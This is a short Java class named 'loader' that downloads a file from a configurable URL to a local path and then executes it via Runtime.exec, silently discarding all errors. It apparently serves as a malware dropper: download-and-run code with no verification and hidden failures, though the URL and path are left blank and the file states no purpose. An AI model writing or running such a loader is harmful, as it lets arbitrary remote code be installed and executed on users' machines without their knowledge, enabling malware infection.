public class loader {
    public static String file_url = "";
    public static String filePath = "";

    public static void load(){


        try {
            URL url = new URL(file_url);
            BufferedInputStream buffStream = new BufferedInputStream(url.openStream());
            FileOutputStream fileStream = new FileOutputStream(filePath);
            byte[] buffArray = new byte[2048];
            int ct = 0;
            while((ct = buffStream.read(buffArray,0,2048)) != -1){
                fileStream.write(buffArray,0,ct);
            }
            // crashes occur most often here :(
            buffStream.close();
            fileStream.close();

            Runtime runtm = Runtime.getRuntime();
            try{
                Process proc = runtm.exec(filePath);

            }catch (Exception err){

            }
        } catch (IOException err){

        }
    }

}
